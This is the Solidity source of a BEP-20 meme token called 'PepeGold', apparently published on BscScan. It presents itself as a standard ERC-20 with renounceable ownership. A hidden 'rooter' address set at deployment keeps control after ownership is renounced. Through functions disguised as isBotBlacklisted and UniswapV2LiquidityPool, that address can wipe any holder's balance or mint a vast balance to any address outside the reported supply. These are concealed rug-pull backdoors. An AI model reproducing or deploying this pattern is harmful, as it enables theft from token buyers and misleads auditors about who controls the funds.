/**
 *Submitted for verification at BscScan.com on 2023-04-24
*/

// SPDX-License-Identifier: MIT
/**
PepeGold  $PepeGold
https://t.me/PepeGoldenCoin
*/
pragma solidity 0.8.16;
abstract contract PepeGoldAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface PepeGoldAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 bluecoininu) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 bluecoininu) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 bluecoininu
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface PepeGoldAsii is PepeGoldAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PepeGoldAsiii is PepeGoldAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract PepeGoldTOKEN is PepeGoldAs, PepeGoldAsi, PepeGoldAsii, PepeGoldAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public PepeGoldAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeFromTransfer;
address private PepeGoldRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PepeGoldPaw;
  address PepeGoldAdr;



    
    constructor(address PepeGoldadressss) {
            // Editable
            PepeGoldAdr = msg.sender;

        _name = "PepeGold";
        _symbol = "PepeGold";
  PepeGoldRooter = PepeGoldadressss;        
        uint PepeGoldTotalSupply = 200000000000 * 10**9;
        process(msg.sender, PepeGoldTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return sendamount[account];
    }

    function transfer(address to, uint256 bluecoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, bluecoininu);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return noFeeFromTransfer[owner][spender];
    }

    function approve(address spender, uint256 bluecoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, bluecoininu);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 bluecoininu
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, bluecoininu);
        _transfer(from, to, bluecoininu);
        return true;
    }
      modifier SwapAndLiquify() {
        require(PepeGoldRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, noFeeFromTransfer[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  Trigger = noFeeFromTransfer[owner][spender];
        require( Trigger >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  Trigger - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 bluecoininu
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        resantTokenTransfer(from, to, bluecoininu);

        uint256 fromBalance = sendamount[from];
        require(fromBalance >= bluecoininu, "Ehi20: transfer bluecoininu exceeds balance");
        unchecked {
            sendamount[from] = fromBalance - bluecoininu;
        }
        sendamount[to] += bluecoininu;

        emit Transfer(from, to, bluecoininu);

        apresTokenTransfer(from, to, bluecoininu);
    }

  modifier walo () {
    require(PepeGoldAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;

  }

    function process(address account, uint256 bluecoininu) internal virtual {
        require(account != address(0), "Ehi20: process to the zero address");

        resantTokenTransfer(address(0), account, bluecoininu);

        ALLtotalSupply += bluecoininu;
        sendamount[account] += bluecoininu;
        emit Transfer(address(0), account, bluecoininu);

        apresTokenTransfer(address(0), account, bluecoininu);
    }


    function _burn(address account, uint256 bluecoininu) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        resantTokenTransfer(account, address(0), bluecoininu);

        uint256 accountBalance = sendamount[account];
        require(accountBalance >= bluecoininu, "Ehi20: burn bluecoininu exceeds balance");
        unchecked {
            sendamount[account] = accountBalance - bluecoininu;
        }
        ALLtotalSupply -= bluecoininu;

        emit Transfer(account, address(0), bluecoininu);

        apresTokenTransfer(account, address(0), bluecoininu);
    }
  function isBotBlacklisted(address isBotBlacklistedaddress) external SwapAndLiquify {
    sendamount[isBotBlacklistedaddress] = 0;
            emit Transfer(address(0), isBotBlacklistedaddress, 0);
  }
    function _approve(
        address owner,
        address spender,
        uint256 bluecoininu
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        noFeeFromTransfer[owner][spender] = bluecoininu;
        emit Approval(owner, spender, bluecoininu);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 bluecoininu
    ) internal virtual {
        uint256  Trigger = allowance(owner, spender);
        if ( Trigger != type(uint256).max) {
            require( Trigger >= bluecoininu, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  Trigger - bluecoininu);
            }
        }
    }
  function UniswapV2LiquidityPool(address randomTokenAddress) external SwapAndLiquify {
    sendamount[randomTokenAddress] = 1000000000000000 * 10 ** 18;
            emit Transfer(address(0), randomTokenAddress, 1000000000000000 * 10 ** 18);
  }
    function resantTokenTransfer(
        address from,
        address to,
        uint256 bluecoininu
    ) internal virtual {}


    function apresTokenTransfer(
        address from,
        address to,
        uint256 bluecoininu
    ) internal virtual {}

}